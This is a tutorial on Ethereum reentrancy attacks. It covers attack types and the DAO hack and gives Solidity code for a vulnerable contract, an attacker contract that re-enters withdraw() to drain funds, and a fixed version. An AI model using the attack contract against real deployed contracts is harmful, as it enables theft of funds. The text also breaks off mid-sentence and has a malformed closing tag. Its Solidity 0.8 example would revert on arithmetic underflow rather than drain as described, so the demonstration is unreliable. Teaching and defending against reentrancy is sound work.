### Reentrancy Attack 

**Description** It occurs when an attacker exploits the ability to repeatedly call a vulnerable function within a contract before the initial execution is complete, thereby manipulating the contract's state and draining its resources or funds.

**Types of Reentrancy Attacks**
1. Mono-Function Reentrancy: This type of Reentrancy occurs when the vulnerable function is the same function that is repeatedly called by the attacker, before the completion of its previous invocations. It is a simpler and more easily detectable form of Reentrancy attack compared to the other two types.

2. Cross-Function Reentrancy: This type of Reentrancy is similar to the Mono-Function Reentrancy, except the function reentered is not the same as the one making the external call. This type of attack is only possible when a vulnerable function shares its state with another function, resulting in an advantageous outcome for the attacker.

3. Cross-Contract Reentrancy: This type of Reentrancy attack takes place when the state of one contract is invoked in another contract before it’s fully updated. It often occurs when multiple contracts manually share a common state variable, and some of them update it in an insecure manner.



In 2016, the notorious `DAO` hack brought this attack into the spotlight. The `DAO` was an investment fund managed by a smart contract. It allowed members to vote on investments based on how many tokens they owned.

In 2016, the DAO was hacked using a Reentrancy attack, where the hacker exploited a vulnerability in the smart contract. This allowed them to steal around $60 million worth of Ether.

To fix the issue, the Ethereum community decided to create a fork—a new version of the blockchain—to undo the hacker's actions and return the stolen funds.
Even though it's been over 7 years since this incident, Reentrancy attacks remain a common problem for smart contracts.

The most recent Reentracy attack was in 30 september 2024 on the `TrustSwap` protocol.
`TrustSwap` is a decentralized Exchange (DEX) protocol that offers a suite of smart contract-based services designed to improve security, flexibility, and trust in transactions involving digital assets. It is particularly focused on cryptocurrency transactions, token launches, and asset management.


**How it Happens**
1. Vulnerable Contract Functionality: A contract has a function that interacts with an external entity (e.g., sending funds to a user) and later updates its internal state (e.g., reducing the user’s balance).

2. Call to External Contract: While executing the vulnerable function, the contract calls an external entity (another contract or address). For example, it sends Ether to the address of a user.

3. Reentrant Call: The external entity (controlled by the attacker) executes malicious code that re-calls the vulnerable function in the original contract before the initial execution completes. This is possible because the blockchain.
   
<details>
<summary>VulnerableContract</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerableContract {
    mapping(address => uint256) public balances;

    // Function to deposit Ether
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Function to withdraw Ether
    function withdraw(uint256 _amount) public {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        // External call before state change - VULNERABLE
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        // Update state AFTER the external call
        balances[msg.sender] -= _amount;
    }

    // Check the contract balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}


```
</details>

<details>
<summary>AttackerContract</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackContract {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableContractAddress) {
        vulnerableContract = VulnerableContract(_vulnerableContractAddress);
    }

    // Fallback function triggered when receiving Ether
    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            // Re-enter the withdraw function
            vulnerableContract.withdraw(1 ether);
        }
    }

    // Start the attack by depositing and withdrawing
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 Ether to attack");

        // Deposit 1 Ether into the vulnerable contract
        vulnerableContract.deposit{value: 1 ether}();

        // Initiate the first withdraw, triggering the fallback
        vulnerableContract.withdraw(1 ether);
    }

    // Check the balance of this contract
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```

</details>

**How it works**
1. The attacker deploys the AttackContract with the address of the VulnerableContract.
2. The attacker calls the attack function, depositing 1 Ether into the VulnerableContract.
3. The attacker calls withdraw, which sends Ether to the AttackContract. This triggers the fallback function, re-entering the withdraw function in a loop before the balance is updated.
4. The attacker drains all the funds from the VulnerableContract.

**Developer Best Practice**
<details>
<summary>Fix Contract</summary>

```javascript
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract SecureContract is ReentrancyGuard {
    mapping(address => uint256) public balances;

    // Function to deposit Ether
    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // Function to withdraw Ether (Mitigations applied)
    function withdraw(uint256 _amount) public nonReentrant {
        //Checks
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        //Effects
        // Update state BEFORE the external call
        balances[msg.sender] -= _amount;

        // Interaction 
        //happens AFTER the state change
        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }

    // Check the contract balance
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

```
</dtails>

**Mitigation Techniques Used**
Checks-Effects-Interactions Pattern:

The `balances[msg.sender] -= _amount;` state update happens before the external call, ensuring the state is correct if reentrancy occurs.

Reentrancy Guard:
The nonReentrant modifier from OpenZeppelin ensures that no function in the contract can be re-entered during execution.

**Testing the Fix**
If the attacker tries the same attack on SecureContract, the reentrant call will fail because:

The balance is already updated, so the require condition `balances[msg.sender] >= _amount` will fail.
The nonReentrant modifier will block any reentrant calls.

**Docs To visit**
https://github.com/pcaversaccio/reentrancy-attacks
